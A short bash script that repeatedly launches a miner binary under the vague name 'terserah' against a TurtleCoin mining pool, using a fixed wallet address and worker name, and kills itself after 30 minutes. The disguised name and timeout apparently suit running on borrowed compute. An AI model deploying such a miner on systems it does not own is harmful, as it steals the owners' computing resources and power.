#!/bin/bash
{
  sleep 1800s
  kill $$
} &

while true
do
  ./terserah -a argon2id_chukwa2 -o turtlecoin.herominers.com:10381 -u TRTLv2Vj5Ss3dLLKw3YW6iNoTeM7MCecyEwBydoKo3LkgA4Kyr3G4iqE4V9TR7u7A9TiWeKkrv3LXV4LTmJEpE1EBrk9AsRx3Lo.myworker
  sleep 1
done
